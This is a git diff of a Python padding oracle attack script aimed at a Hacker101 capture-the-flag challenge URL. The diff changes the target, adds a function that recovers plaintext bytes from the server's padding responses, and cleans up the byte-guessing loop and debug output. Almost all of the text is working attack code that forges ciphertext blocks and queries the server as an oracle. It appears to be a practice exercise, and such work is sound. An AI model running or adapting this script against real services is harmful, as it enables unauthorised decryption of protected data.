@@ -5,7 +5,7 @@ import base64
 import time
 import copy
 
-url="https://753be022c7c169da44b81a773f5adcb6.ctf.hacker101.com/?post=7hHtETjfNWmHbkjKZdkBXp5OJju8D6Am8Xl5X-9MzMqa2OcrTroCRJ4u9Se01Ga81UmVKIBt194cxQwb05HC6ALyMHDfiUowj90y9Z7fzpqqA9uWaDoe2VSJEkKKlamgPAQpJqsBCBG9iroisdGYtirIDA3wpFmucHfIx4XFTG1sY!V-qnO-HRBRefAHGL!M3NcsH9K2taaj4JlqgLGO0w~~"
+url="https://e1aee1cd19f42aae4427a7975792802d.ctf.hacker101.com/?post=0DX0U-Q4lwggk97pxPQ!hE-WhVs2TKjs32CIdbDw9NhuDA5RlH0jI5xmOH0hklx63aORQF4eVrQZfGkOkbWdGYpG-wZci9UmbtZ-zZ3r4LnFyqhY4jxdHXQ9Wc-GLuPEVfXCVOewL0BDjgp3m0RvKpnAlnscdbJDAb8ovUphXLpPZD6NZA9pqnaZ8o7rx71Aq8nzsGav4xF8ttdJvqbHXg~~"
 domain=url.split("?")[0]
 params=url.split("=")[1]
 ua = fake_useragent.UserAgent()
@@ -26,7 +26,6 @@ def padding_correct(response):
     elif "PaddingException" in text:
         return False
     elif "Traceback" in text:
-        print("unexpected! (possible 0x01 padding now...)")
         return True 
     else:
         print(text)
@@ -41,12 +40,11 @@ def blocks_to_dump(blocks):
 
 def tune_padding(byte_array, block):
     padding_length = len(byte_array)
-    # n^m=p {n=original block ciphered n-1, m=changed block ciphered n-1 for the padding, p=the padding}
-    print("Tengo que hacerlo con" + str(padding_length))
-    print(blocks[block])
+    # n^m=p {n=original ciphered block n-1, m=changed ciphered block n-1 for the padding, p=the padding}
+    print(f"\033[36mHave to tune {str(padding_length)} paddings before permutating the current position.\033[0m")
     for to_change in range(padding_length):
-        print(f"changing {blocks[block][16-(to_change+1)]} to be... 0x{padding_length:02x} on the +1 block.")
-        print(f"The original value of the plaintex was")
+        print(f"\033[36mChanging {blocks[block][16-(to_change+1)]} to be... 0x{padding_length:02x} on the +1 block.\033[0m")
+        print(f"\033[36mThe original value of the plaintex was\033[0m")
         original_value = blocks[block][16-to_change-1]^original_block[block][16-to_change-1]^padding_length
         print(blocks[block][16-to_change-1],original_block[block][16-to_change-1],padding_length)
         print(blocks[block][16-to_change-1])
@@ -54,47 +52,53 @@ def tune_padding(byte_array, block):
         blocks[block][16-to_change-1] = original_block[block][16-to_change-1]^original_value^(padding_length+1)
         print(blocks[block][16-to_change-1])
 
+def get_plaintext(byte_position, block):
+    # n^m^p = t {n=ciphered original block n-1, m=changed ciphered block n-1 for the correct padding, p=the padding, t=plaintext}
+    n = blocks[block][byte_position]
+    m = original_block[block][byte_position]
+    p = 16-byte_position
+    print(n,m,p)
+    plainchar = n^m^p
+    print(f"The plaintext here was {plainchar}")
+    plaintext.append(plainchar)
+    print(f"\033[33mThe current plaintext string is {plaintext}")
+
 # >3 oracle
 def call_oracle(domain,payload):
     response = requests.get(f"{domain}?post={payload}", headers={"User-Agent": ua.chrome})
     return padding_correct(response) 
 
+plaintext = bytearray()
 for block in reversed(range(1, len(blocks)-1)):
     guesses = bytearray()
-    possible_bytes = bytearray() 
     for byte_position in reversed(range(16)):
         # pre
         if byte_position<15:
+            print(guesses)
             tune_padding(guesses, block)
-            possible_bytes=bytearray()
-        for i in range(197,256):
-            print(f"working with {hex(blocks[block][byte_position])}")
+        for i in range(256):
             blocks[block][byte_position] = i
             payload=hex_to_url_b64(blocks_to_dump(blocks))
-            #response = requests.get(f"{domain}?post={payload}", headers={'User-Agent': ua.chrome})  
-#            if padding_correct(response):
             if call_oracle(domain, payload):
-                print(f"\033[32m[+++][====]Possible with the byte {hex(i)}[=+===+==]\033[0m")
+                print(f"\033[33m[+++][====]Possible with the byte {hex(i)}[=+===+==]\033[0m")
                 if byte_position == 15:
                     print(f"\033[33mWe are on the last byte, so we have to check if this byte makes the padding 0x01 or 0x02..0xFF\033[0m")
-                    print(f"Previous block = {blocks[block][byte_position-1]}")
-                    print(blocks[block][byte_position],blocks[block][byte_position-1])
+                    print(f"\033[34mPrevious block = {blocks[block][byte_position-1]}\033[0m")
                     blocks[block][byte_position-1]+=1
-                    print(payload)
-                    print(f"Previous block (updated) = {blocks[block][byte_position-1]}")
+                    print(f"\033[34mPrevious block (updated) = {blocks[block][byte_position-1]}\033[0m")
                     payload=hex_to_url_b64(blocks_to_dump(blocks))
-                    print(payload)
                     if call_oracle(domain, payload):
-                        print("Possible 0x01")
+                        print("\033[32m0x01 padding found!\033[0m")
+                        guesses.append(i)
+                        get_plaintext(byte_position, block)
+                        break
                     else:
-                        print("Possible 0x02...0xFF")
-                    print(f"checking...")
+                        print("\033[35mPossible 0x02...0xFF, not adding the bytes.\033[0m")
                     blocks[block][byte_position-1]-=1
-                    print(blocks[block][byte_position],blocks[block][byte_position-1])
-                    print("done!");
-                    print(f"Previous block (end) = {blocks[block][byte_position-1]}")
+                    print(f"\033[34mPrevious block back to it's original value ({blocks[block][byte_position-1]})\033[0m")
                 else:  
-                    possible_bytes.append(i)
-                print(possible_bytes)
+                    guesses.append(i)
+                    get_plaintext(byte_position, block)
+                    break
             else:
-                print(f"\033[31mTrying with byte value {i} on the {byte_position}th position of the {block}th block\033[0m")
+                print(f"\033[31mTrying with byte value {hex(blocks[block][byte_position])} ({i}) on the {byte_position}th position of the {block}th block.\033[0m")
